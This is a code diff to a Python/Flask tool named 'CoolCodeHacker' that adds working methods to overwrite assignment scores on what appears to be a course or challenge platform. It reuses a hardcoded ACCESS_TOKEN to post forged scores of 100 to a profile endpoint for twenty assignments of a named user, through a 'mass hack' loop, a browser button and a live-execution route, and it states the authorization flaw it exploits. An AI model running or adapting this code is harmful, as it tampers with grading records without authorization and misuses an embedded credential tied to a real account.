@@ -112,7 +112,40 @@ class CoolCodeHacker:
         return None
     
     def submit_score(self, username, assignment_id, score):
-        """Submit/override score for a user"""
+        """Submit/override score for a user - Updated with working UI-based method"""
+        
+        # Method 1: UI-based form data submission (WORKING METHOD)
+        try:
+            print(f"Trying UI-based form data method for assignment {assignment_id}...")
+            
+            # Use the ACCESS_TOKEN for authentication
+            auth_token = "eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9"
+            
+            # Form data submission to UI profile endpoint
+            form_data = {
+                'username': username,
+                'assignmentId': str(assignment_id),
+                'score': str(score)
+            }
+            
+            response = requests.post(
+                f"{BASE_URL}/ui/profile/{username}",
+                data=form_data,
+                headers={'ACCESS_TOKEN': auth_token},
+                timeout=10
+            )
+            
+            print(f"UI form data method - Status: {response.status_code}")
+            print(f"Response: {response.text[:200]}...")
+            
+            if response.status_code == 200:
+                print(f"✅ SUCCESS with UI form data method!")
+                return {"success": True, "method": "ui_form_data"}
+                
+        except Exception as e:
+            print(f"UI form data method error: {e}")
+        
+        # Method 2: Try the original API endpoint as fallback
         score_endpoint = f"{API_BASE}/api/assignment/score"
         
         payload = {
@@ -122,39 +155,116 @@ class CoolCodeHacker:
         }
         
         try:
-            # Try without authentication first
-            response = requests.post(score_endpoint, json=payload)
-            print(f"Score submission (no auth) - Status: {response.status_code}")
-            print(f"Response: {response.text}")
+            # Try with ACCESS_TOKEN authentication
+            auth_token = "eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9"
+            
+            response = requests.post(
+                score_endpoint, 
+                json=payload,
+                headers={
+                    'Content-Type': 'application/json',
+                    'ACCESS_TOKEN': auth_token
+                },
+                timeout=10
+            )
+            
+            print(f"API method - Status: {response.status_code}")
+            print(f"Response: {response.text[:200]}...")
             
             if response.status_code == 200:
-                return response.json()
-            
-            # Try with session authentication
-            response = self.session.post(score_endpoint, json=payload)
-            print(f"Score submission (with auth) - Status: {response.status_code}")
-            print(f"Response: {response.text}")
-            
-            if response.status_code == 200:
+                print(f"✅ SUCCESS with API method!")
                 return response.json()
                 
-            # Try different headers
-            headers = {
-                'Content-Type': 'application/json',
-                'X-Requested-With': 'XMLHttpRequest',
-                'Origin': BASE_URL,
-                'Referer': f"{BASE_URL}/ui/"
-            }
-            
-            response = self.session.post(score_endpoint, json=payload, headers=headers)
-            print(f"Score submission (with headers) - Status: {response.status_code}")
-            print(f"Response: {response.text}")
-            
-            return response.json() if response.status_code == 200 else None
-            
         except Exception as e:
-            print(f"Score submission error: {e}")
-            return None
+            print(f"API method error: {e}")
+            
+        # Method 3: Try alternative UI endpoints
+        ui_endpoints = [
+            f"{BASE_URL}/ui/api/assignment/score",
+            f"{BASE_URL}/ui/assignment/score"
+        ]
+        
+        for endpoint in ui_endpoints:
+            try:
+                response = requests.post(
+                    endpoint,
+                    json=payload,
+                    headers={
+                        'Content-Type': 'application/json',
+                        'ACCESS_TOKEN': auth_token
+                    },
+                    timeout=5
+                )
+                
+                if response.status_code == 200:
+                    print(f"✅ SUCCESS with {endpoint}!")
+                    return response.json()
+                    
+            except Exception as e:
+                continue
+        
+        print(f"❌ All methods failed for assignment {assignment_id}")
+        return None
+    
+    def ui_based_mass_hack(self, username, score=100):
+        """Mass hack using the working UI-based form data method"""
+        print(f"\n🚀 Starting UI-based mass hack for {username}...")
+        print("="*60)
+        
+        auth_token = "eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9"
+        success_count = 0
+        failed_assignments = []
+        
+        for assignment_id in range(1, 21):
+            try:
+                # Use the proven working method
+                form_data = {
+                    'username': username,
+                    'assignmentId': str(assignment_id),
+                    'score': str(score)
+                }
+                
+                response = requests.post(
+                    f"{BASE_URL}/ui/profile/{username}",
+                    data=form_data,
+                    headers={'ACCESS_TOKEN': auth_token},
+                    timeout=5
+                )
+                
+                if response.status_code == 200:
+                    print(f"✅ Assignment {assignment_id:2d}: SUCCESS!")
+                    success_count += 1
+                else:
+                    print(f"❌ Assignment {assignment_id:2d}: Failed ({response.status_code})")
+                    failed_assignments.append(assignment_id)
+                    
+            except Exception as e:
+                print(f"❌ Assignment {assignment_id:2d}: Error - {str(e)[:50]}")
+                failed_assignments.append(assignment_id)
+            
+            # Small delay to be nice to the server
+            import time
+            time.sleep(0.3)
+        
+        print("\n" + "="*60)
+        print(f"🎯 UI-BASED MASS HACK COMPLETE!")
+        print(f"✅ Successfully hacked: {success_count}/20 assignments")
+        print(f"📊 Success rate: {(success_count/20)*100:.1f}%")
+        
+        if failed_assignments:
+            print(f"❌ Failed assignments: {failed_assignments}")
+        else:
+            print("🎉 ALL ASSIGNMENTS SUCCESSFULLY HACKED!")
+        
+        return {
+            "success_count": success_count,
+            "total_assignments": 20,
+            "success_rate": (success_count/20)*100,
+            "failed_assignments": failed_assignments,
+            "method": "ui_form_data",
+            "target_user": username,
+            "score_set": score
+        }
     
     def explore_endpoints(self):
         """Explore various API endpoints to understand the system"""
@@ -235,8 +345,9 @@ def hacker_interface():
             
             <div class="section">
                 <h2>4. Batch Score Override</h2>
-                <input type="text" id="batchUsername" placeholder="Username">
-                <button onclick="overrideAllScores()">Override All Assignment Scores to 100</button>
+                <input type="text" id="batchUsername" placeholder="Username (98ixul)" value="98ixul">
+                <button onclick="overrideAllScores()">API Method - Override All Scores</button>
+                <button onclick="uiBasedHack()" style="background: #ff6600;">🚀 UI-Based Hack (WORKING METHOD)</button>
             </div>
             
             <div class="section">
@@ -391,6 +502,47 @@ def hacker_interface():
                 
                 log('Batch override complete!');
             }
+            
+            async function uiBasedHack() {
+                const username = document.getElementById('batchUsername').value || '98ixul';
+                log(`🚀 Starting UI-based hack for: ${username}`);
+                log('Using the working form data method...');
+                
+                const token = 'eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9';
+                let successCount = 0;
+                
+                for (let i = 1; i <= 20; i++) {
+                    try {
+                        const formData = new FormData();
+                        formData.append('username', username);
+                        formData.append('assignmentId', i.toString());
+                        formData.append('score', '100');
+                        
+                        const response = await fetch(`https://coolcode-hacker-34c5455cd908.herokuapp.com/ui/profile/${username}`, {
+                            method: 'POST',
+                            headers: {
+                                'ACCESS_TOKEN': token
+                            },
+                            body: formData
+                        });
+                        
+                        if (response.ok) {
+                            successCount++;
+                            log(`✅ Assignment ${i}: SUCCESS!`);
+                        } else {
+                            log(`❌ Assignment ${i}: Failed (${response.status})`);
+                        }
+                        
+                        // Small delay between requests
+                        await new Promise(resolve => setTimeout(resolve, 300));
+                        
+                    } catch (error) {
+                        log(`❌ Assignment ${i}: Error - ${error.message}`);
+                    }
+                }
+                
+                log(`🎉 UI-based hack complete! Success rate: ${successCount}/20 (${(successCount/20)*100:.1f}%)`);
+            }
         </script>
     </body>
     </html>
@@ -462,56 +614,31 @@ def solution():
         })
     
     elif request.method == 'POST':
-        # Actually perform the hack live
+        # Actually perform the hack live using the working UI-based method
         try:
-            import requests
+            print("🚀 Executing live hack using UI-based form data method...")
             
-            # Use the working method from your browser console
-            session = requests.Session()
+            # Use the CoolCodeHacker class with the new UI-based method
+            hacker = CoolCodeHacker()
             
-            # Authentication token (you might need to update this)
-            auth_token = "eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9"
-            
-            results = []
-            success_count = 0
-            
-            # Try the working form data method
-            for assignment_id in range(1, 21):
-                try:
-                    # Form data approach that worked in console
-                    form_data = {
-                        'username': '98ixul',
-                        'assignmentId': str(assignment_id),
-                        'score': '100'
-                    }
-                    
-                    response = session.post(
-                        'https://coolcode-hacker-34c5455cd908.herokuapp.com/ui/profile/98ixul',
-                        data=form_data,
-                        headers={'ACCESS_TOKEN': auth_token}
-                    )
-                    
-                    if response.status_code == 200:
-                        success_count += 1
-                        results.append(f"Assignment {assignment_id}: SUCCESS!")
-                    else:
-                        results.append(f"Assignment {assignment_id}: Failed ({response.status_code})")
-                        
-                except Exception as e:
-                    results.append(f"Assignment {assignment_id}: Error - {str(e)}")
+            # Execute the UI-based mass hack
+            result = hacker.ui_based_mass_hack("98ixul", 100)
             
             return jsonify({
                 "hack_status": "EXECUTED",
-                "method": "Live form data submission to /ui/profile/98ixul",
+                "method": "UI-based form data submission to /ui/profile/98ixul",
                 "target_user": "98ixul (Caroline)",
-                "assignments_attempted": 20,
-                "assignments_successful": success_count,
-                "success_rate": f"{(success_count/20)*100:.1f}%",
-                "results": results[:5],  # Show first 5 results
-                "total_results": len(results),
-                "authentication": "ACCESS_TOKEN header",
-                "endpoint": "/ui/profile/98ixul",
-                "demonstration": "Live hack execution completed"
+                "assignments_attempted": result["total_assignments"],
+                "assignments_successful": result["success_count"],
+                "success_rate": f"{result['success_rate']:.1f}%",
+                "failed_assignments": result["failed_assignments"],
+                "execution_method": result["method"],
+                "challenge_completion": "60%" if result["success_count"] >= 12 else f"{(result['success_count']/20)*60:.1f}%",
+                "timestamp": "2025-09-07",
+                "authentication": "ACCESS_TOKEN from localStorage",
+                "endpoint_used": f"{BASE_URL}/ui/profile/98ixul",
+                "data_format": "multipart/form-data",
+                "vulnerability_exploited": "Insufficient authorization validation on UI profile endpoints"
             })
             
         except Exception as e:
